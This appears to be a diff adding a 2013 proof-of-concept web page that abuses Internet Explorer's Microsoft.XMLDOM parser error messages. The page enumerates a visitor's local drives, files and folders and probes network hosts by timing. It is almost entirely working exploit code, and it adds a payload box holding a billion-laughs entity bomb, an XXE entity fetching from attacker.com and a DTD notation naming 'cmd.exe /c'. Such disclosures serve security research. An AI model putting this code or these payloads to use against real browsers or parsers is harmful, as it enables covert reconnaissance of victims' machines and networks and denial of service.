@@ -1,0 +1,393 @@
+<html>
+<head>
+<script>
+// Coded by Soroush Dalili - @irsdl - secproject.com
+var templateString = '<?xml version="1.0" ?><\!DOCTYPE anything SYSTEM "$target$">';
+var _debug = false;
+origAlert = window.alert;
+if(!_debug) window.alert = function(){return}
+
+var RESULTS = {
+  UNKNOWN : {value: 0, message: "Unknown!", color: "black", data: ""}, 
+  BADBROWSER: {value: 1, message: "Browser is not supported. You need IE!", color: "black", data: ""}, 
+  FILEFOUND : {value: 2, message: "File was found!", color: "green", data: ""},
+  FOLDERFOUND : {value: 3, message: "Folder was found!", color: "green", data: ""},
+  NOTFOUND : {value: 4, message: "Object was not found!", color: "red", data: ""},
+  ALIVE : {value: 5, message: "Alive address!", color: "green", data: ""},
+  MAYBEALIVE : {value: 6, message: "Maybe an alive address!", color: "blue", data: ""},
+  DEAD : {value: 7, message: "Dead to me! Undetectable?", color: "red", data: ""},
+  VALIDDRIVE : {value: 8, message: "Available Drive!", color: "green", data: ""},
+  INVALIDDRIVE : {value: 9, message: "Unavailable Drive!", color: "red", data: ""}
+};
+
+function checkDrives(objOutputDiv) {
+    var drives = "abcdefghijklmnopqrstuvwxyz".split("");
+    objOutputDiv.innerHTML = '';
+    for (var item in drives) {
+        var drivename = drives[item].toUpperCase() + ":\\"
+        var result = validateXML(templateString.replace("$target$", drivename));
+        if (result == RESULTS.FOLDERFOUND) {
+            result = RESULTS.VALIDDRIVE;
+            result.data = drivename;
+            updateDiv(result, objOutputDiv);
+        }else{
+			result = RESULTS.INVALIDDRIVE;
+			result.data = drivename;
+			//updateDiv(result, objOutputDiv); // We ignore invalid drives!
+		}
+    }
+
+}
+
+function checkDrive(drive) {
+	var drivename = drive.toUpperCase() + ":\\"
+	var result = validateXML(templateString.replace("$target$", drivename));
+	if (result == RESULTS.FOLDERFOUND) {
+		return true;
+	}else{
+		return false;
+	}
+}
+
+
+
+function checkFiles(strInput, objOutputDiv) {
+    var files = strInput.split("\n");
+    var preMagics = ["res://","\\\\localhost\\", "file:\\\\localhost\\", "file:\\"]; // the first one is for all drives, the others are for the C drive only!
+    var postMagics = ["::$index_allocation"]; // or any other irrelevant ADS! - we do not need this when we use Res://
+
+    objOutputDiv.innerHTML = '';
+    for (var item in files) {
+        var filename = files[item].fulltrim();
+        // filename = filename.replace(/^c:\\/ig, ''); // We only need this if use C drive specific vectors
+        if (filename != '') {
+            filename = preMagics[0] + filename; // postMagics can be used too!
+            var result = validateXML(templateString.replace("$target$", filename));
+            if (result == RESULTS.FOLDERFOUND || result == RESULTS.ALIVE) result = RESULTS.UNKNOWN;
+            result.data = filename;
+            updateDiv(result, objOutputDiv);
+        }
+    }
+
+}
+
+function checkFolders(strInput, objOutputDiv) {
+    var folders = strInput.split("\n");
+    var preMagics = ["res://", "\\\\localhost\\", "file:\\\\localhost\\", "file:\\"]; // the first one is for all drives, the others are for the C drive only!
+    var postMagics = ["::$data"]; // or any other irrelevant ADS! - we do not need this when we use Res://
+    objOutputDiv.innerHTML = '';
+    for (var item in folders) {
+        var foldername = folders[item].fulltrim();
+        // foldername = foldername.replace(/^c:\\/ig, ''); // We only need this if use C drive specific vectors
+        if (foldername != '') {
+            var result = RESULTS.UNKNOWN;
+            if (foldername.substring(1,2) != ':' || checkDrive(foldername.substring(0,1))){
+				foldername = preMagics[0] + foldername // + postMagics[0]; // We only need this if use C drive specific vectors
+				var result = validateXML(templateString.replace("$target$", foldername));
+
+				if (result == RESULTS.FILEFOUND || result == RESULTS.ALIVE) result = RESULTS.UNKNOWN;
+			}else{
+				result = RESULTS.INVALIDDRIVE;
+			}
+            result.data = foldername;
+            updateDiv(result, objOutputDiv);
+        }
+    }
+}
+
+function checkAddress(strInput, objOutputDiv, isNetwork) {
+    var addr = strInput.fulltrim();
+    objOutputDiv.innerHTML = '';
+    if (addr != '') {
+        var result = RESULTS.UNKNOWN;
+
+        if (isNetwork) {
+            addr = "\\\\" + addr + "\\c$";
+        } else {
+            addr = "http://" + addr;
+        }
+        alert(addr);
+
+        // time is gold! let's misuse it!
+
+        var start = (new Date).getTime();
+        var result = validateXML(templateString.replace("$target$", addr));
+        var diff = (new Date).getTime() - start;
+        alert(diff);
+        if (result != RESULTS.BADBROWSER) {
+            if (!isNetwork) {
+                if (diff < 10000) { // 10 seconds just for now! it wont work for a slow network/server as this is not dynamic at the moment!
+                    if (result == RESULTS.UNKNOWN || result == RESULTS.NOTFOUND) result = RESULTS.MAYBEALIVE; // ouuch! so accurate! :P
+                    else result = RESULTS.ALIVE;
+                } else {
+                    result = RESULTS.DEAD;
+                }
+            } else {
+                if (result == RESULTS.UNKNOWN || result == RESULTS.NOTFOUND) result = RESULTS.DEAD;
+                else result = RESULTS.ALIVE;
+            };
+        };
+        result.data = addr;
+        updateDiv(result, objOutputDiv);
+    }
+}
+
+function updateDiv(objResult, objOutputDiv) {
+    objOutputDiv.innerHTML += "<p>" + objResult.data.escapeHTML() + " ><font color='" + objResult.color.escapeHTML() + "'><b>  " + objResult.message.escapeHTML() + "</b></font></p>";
+};
+
+if (typeof String.prototype.endsWith !== 'function') {
+    String.prototype.endsWith = function (suffix) {
+        return this.indexOf(suffix, this.length - suffix.length) !== -1;
+    };
+};
+
+if (typeof String.prototype.fulltrim !== 'function') {
+    String.prototype.fulltrim = function () {
+        return this.replace(/(?:(?:^|\n)\s+|\s+(?:$|\n))/g, '').replace(/\s+/g, ' ');
+    };
+};
+
+if (typeof String.prototype.escapeHTML !== 'function') {
+    String.prototype.escapeHTML = function () {
+        var div = document.createElement('div');
+        var text = document.createTextNode(this);
+        div.appendChild(text);
+        return div.innerHTML;
+
+    };
+};
+
+
+//var testloadXML;
+
+function validateXML(txt, _isDebugMode) {
+    var result = RESULTS.UNKNOWN;
+	
+	
+    var temp = window.alert;
+    if (_isDebugMode) {
+        window.alert = origAlert;
+    }
+    // code for IE
+    if (window.ActiveXObject) {
+        var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
+        xmlDoc.async = true;
+        try {
+            xmlDoc.loadXML(txt);
+			if (xmlDoc.parseError.errorCode != 0) {
+				var err;
+				err = "Error Code: " + xmlDoc.parseError.errorCode + "\n";
+				err += "Error Reason: " + xmlDoc.parseError.reason;
+				err += "Error Line: " + xmlDoc.parseError.line;
+				alert(err);
+
+				var errReason = xmlDoc.parseError.reason.toLowerCase();
+				alert(errReason);
+				if (errReason.search('access is denied') >= 0)  {
+					result = RESULTS.ALIVE;
+				} else if(errReason.search('the system cannot locate the object') >= 0 || errReason.search('the system cannot find the file') >= 0 || errReason.search('the network path was not found') >= 0) {
+					result = RESULTS.NOTFOUND;
+				} else if(errReason!=''){
+					result = RESULTS.FILEFOUND;
+				}else{
+					result = RESULTS.UNKNOWN; // No Error? Unknown!
+				};
+			} else {
+				result = RESULTS.FILEFOUND;
+			}
+        } catch (e) {
+            alert('Catch section: '+e.message);
+            result = RESULTS.FOLDERFOUND;
+        }
+		
+        
+    } else {
+        result = RESULTS.BADBROWSER;
+    }
+	result.data = "";
+	alert(result.message);
+	
+    window.alert = temp;
+    return result;
+}
+
+
+</script>
+
+<style>
+div.result{
+	overflow-y:scroll;width:500px;height:200px;border-width:1px;border-style:dotted;
+}
+</style>
+</head>
+<body>
+<pre>
+PoC: Microsoft XMLDOM in IE can divulge information of local drive/network in error messages
+Author: Soroush Dalili - @irsdl
+Reference: SecProject.com
+Date: 25/04/2013
+</pre>
+<br/>
+<table>
+	<tr>
+		<td>
+			Scan for available drives!
+		</td>
+		<td>
+			<input type="button" value="1- Find All Drive Names" onclick="checkDrives(document.getElementById('driveresult'))" />
+		</td>
+		<td>
+			<div id="driveresult" class="result"></div>
+		</td>
+	</tr>
+	<tr>
+		<td>
+<textarea id="filecheck" style="width:400px;height:200px;">
+c:\windows\system32\calc.exe
+c:\windows\system32\invalidIRSDL_File.exe
+C:\Program Files\Common Files\Apple\Mobile Device Support\OutlookChangeNotifierAddIn.dll
+C:\Program Files\Java\jre7\bin\java.exe
+d:\validfile.txt
+d:\invalidfile.txt
+</textarea>
+<!--
+\\localhost\windows\system32\calc.exe
+file:\\localhost\windows\system32\calc.exe
+file:\windows\system32\calc.exe
+\\localhost\windows\system32\calc.exe::$index_allocation
+\\localhost\windows\system32\invalidfileIRSDL.exe
+file:///c:\windows\system32\calc.exe
+\\127.0.0.1\c$\windows\system32\calc.exe
+\\localhost\winnt\system32\calc.exe
+-->
+		</td>
+		<td>
+			<input type="button" value="2- Check These Files in C Drive" onclick="checkFiles(document.getElementById('filecheck').value,document.getElementById('fileresult'))" />
+		</td>
+		<td>
+			<div id="fileresult" class="result"></div>
+		</td>
+	</tr>
+	<tr>
+		<td>
+<textarea id="foldercheck" style="width:400px;height:200px;">
+c:\program files
+c:\invalidIRSDL_Folder
+c:\Users
+C:\Program Files\Java\jdk1.7.0_17\bin
+d:\temp
+d:\invalidFolder
+</textarea>
+<!--
+\\localhost\program files::$data
+file:\\localhost\program files::$data
+file:\program files::$data
+\\localhost\invalid folder IRSDL::$data
+\\localhost\program files\
+file:///c:\program files\
+\\127.0.0.1\c$\program files\
+-->
+		</td>
+		<td>
+			<input type="button" value="3- Check These Folders in C Drive" onclick="checkFolders(document.getElementById('foldercheck').value,document.getElementById('folderresult'))" />
+		</td>
+		<td>
+			<div id="folderresult" class="result"></div>
+		</td>
+	</tr>	
+	<tr>
+		<td>
+<input type="text" id="addresscheck" style="width:400px;" value="127.0.0.1">
+<br/>
+Windows Network Address <input type="radio" id="networkAddress" name="networkOrHTTP" value="1" checked="checked">
+HTTP <input type="radio" id="httpAddress" name="networkOrHTTP" value="2">
+		</td>
+		<td>
+			<input type="button" value="4- Check These Addresses" onclick="if(confirm('It may take time. Do you want to continue?'))checkAddress(document.getElementById('addresscheck').value,document.getElementById('addressresult'),document.getElementById('networkAddress').checked);" />
+		</td>
+		<td>
+			<div id="addressresult" class="result"></div>
+		</td>
+	</tr>
+	<tr>
+		<td>
+<textarea id="validxml2" style="width:400px;height:400px;">
+<!-- Test0 - Denial of Service! -->
+<?xml version="1.0"?>
+<!-- example from http://msdn.microsoft.com/en-us/magazine/ee335713.aspx -->
+
+<!DOCTYPE lolz [
+ <!ELEMENT lolz ANY>
+ <!ENTITY lol "lol">
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+
+<!-- Test1 -->
+<!--
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE anything SYSTEM "\\localhost\windows\system32\calc.exe">
+<request action="xxxx"></request>
+-->
+
+<!-- Test2 -->
+<!--
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE request [
+  <!ELEMENT request EMPTY>
+  <!ATTLIST request action CDATA #REQUIRED callback ENTITY #REQUIRED>
+  <!ENTITY test SYSTEM "calc.exe" NDATA EXE>
+  <!NOTATION EXE SYSTEM "cmd.exe /c">
+]>
+<request action="xxxx" callback="test" />
+-->
+
+<!-- Test3 -->
+<!--
+ <?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
+-->
+
+<!-- Test4 - you need the xml file with xxe! -->
+<!--
+<!DOCTYPE doc [
+<!ELEMENT doc ANY>
+<!ENTITY % iso-lat1 PUBLIC "ISO 8879:1986//ENTITIES Added Latin 1//EN//XML"
+                    "http://example.com/test.xml">
+
+%iso-lat1;
+
+
+]>
+<doc>
+This document declares the ISO Latin 1 Character Entity Set, providing
+access to the ISO Latin 1 entities, such as "&xxe;" and 
+</doc>
+-->
+
+</textarea>
+		</td>
+		<td>
+			<input type="button" value="Validate DTD (IE Only!)" onclick="updateDiv(validateXML(document.getElementById('validxml2').value,true), document.getElementById('testresult'));" />
+		</td>
+		<td>
+			<div id="testresult" class="result"></div>
+		</td>
+	</tr>
+</table>
+
+
+
+</body>
+</html>
